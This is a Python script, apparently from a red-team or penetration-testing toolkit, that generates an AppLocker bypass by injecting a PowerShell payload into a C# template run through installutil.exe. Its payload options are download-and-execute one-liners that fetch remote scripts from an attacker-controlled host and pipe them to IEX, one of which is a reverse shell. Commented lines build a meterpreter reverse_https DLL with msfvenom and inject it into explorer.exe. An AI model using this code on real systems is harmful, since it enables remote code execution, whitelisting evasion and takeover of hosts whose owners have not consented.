 #!/bin/python3
import subprocess
import socket
import random
from colorama import init
from termcolor import colored
 
init()

def read_file(f):
        with open(f, 'r') as fs:
            content = fs.read()
        return content


def al_reflectiveDllInjection(lhost, lport, arch):
    print(colored(f"[+] Applocker bypass - PowerShell", 'green'))
    
    # create DLL
    # sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f dll -o /var/www/html/met.dll`
    if (arch == "x64"):
        mpayload = "windows/x64/meterpreter/reverse_https"
    elif (arch == "x86"):
        mpayload = "windows/meterpreter/reverse_https"

    #print(colored(f"    [!]", 'red') + colored(f" Copy Invoke-ReflectivePEInjection.ps1 to /var/www/html", 'yellow'))

    print(colored(f"    [!]", 'red') + colored(f" In Visual Studio add ", 'yellow') + colored("System.Configuration.Install", 'white') + colored(" namespace -> right-click on References in the Solution Explorer, choose Add References…, in Assemblies menu select, ", 'yellow') + colored("System.Configuration.Install", 'white'))

    print(colored(f"    [!]", 'red') + colored(f" In Visual Studio add",'yellow') + colored(" System.Management.Automation",'white') + colored(" namespace -> right-click on References in the Solution Explorer, choose Add References…, in Browse ",'yellow') + colored("C:\\Windows\\assembly\GAC_MSIL\\System.Management.Automation\\1.0.0.0__31bf3856ad364e35", 'white'))

    #print(colored(f"    [+] msfvenom -p {mpayload} LHOST={lhost} LPORT={lport} -f dll -o /var/www/html/al-met-{arch}.dll", 'cyan'))

    #subprocess.run(["msfvenom", "-p", mpayload, "LHOST="+lhost, "LPORT="+str(lport), "EXITFUNC=thread", "-f", "dll", "-o", f"/var/www/html/al-met-{arch}.dll" ], capture_output=True, text=True)

    
    print(colored(f"    [!]", 'red') + colored(f" Run program with installUtil: ", 'yellow') + colored("C:\Windows\Microsoft.NET\Framework64\\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\Bypass.exe", 'white'))

    #payload = f"$bytes = (New-Object System.Net.WebClient).DownloadData('http://{lhost}/al-met-{arch}.dll'); (New-Object System.Net.WebClient).DownloadString('http://{lhost}/Invoke-ReflectivePEInjection.ps1') | IEX; $procid = (Get-Process -Name explorer).Id; Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid"
        ## Get msf payload
    ps_payload = input(f"""\nSelect powershell payload:
[1] HostReconing.ps1 (default)
[2] Reverse shell
[9] other                        
[>] Select powershell payload: """)
    
    if (not ps_payload):
        payload = f"(New-Object System.Net.WebClient).DownloadString('http://{lhost}/win/HostReconing.ps1') | IEX; Invoke-HostRecon -KaliIP {lhost} | Out-File -Filepath 'C:\\Windows\\Tasks\\out-recon.txt'"
    elif (int(ps_payload) == 1):
        payload = f"(New-Object System.Net.WebClient).DownloadString('http://{lhost}/win/HostReconing.ps1') | IEX; Invoke-HostRecon -KaliIP {lhost} | Out-File -Filepath 'C:\\Windows\\Tasks\\out-recon.txt'"
    elif (int(ps_payload) == 2):
        payload = f"(New-Object System.Net.WebClient).DownloadString('http://{lhost}/expl-x64-ps_reflection.ps1') | IEX;"
    elif (int(ps_payload) == 9):
        payload = input("[>] Provide powershell payload:  ")
    else:
        payload = f"(New-Object System.Net.WebClient).DownloadString('http://{lhost}/win/HostReconing.ps1') | IEX; Invoke-HostRecon -KaliIP {lhost} | Out-File -Filepath 'C:\\Windows\\Tasks\\out-recon.txt'"

    #payload = f"(New-Object System.Net.WebClient).DownloadString('http://{lhost}/win/HostReconing.ps1') | IEX; Invoke-HostRecon -KaliIP {lhost} | Out-File -Filepath 'C:\\Windows\\Tasks\\out-recon.txt'"

    # C# shellcode runner
    template_name = "AL_bypass_with_reflection.cs"
    template = read_file("templates/Applocker/" + template_name)
    template_out = template.replace("%PAYLOAD%", payload)
    
    f = open(f"output/applocker/{arch}/" + template_name, 'w')
    f.write(template_out)
    f.close()
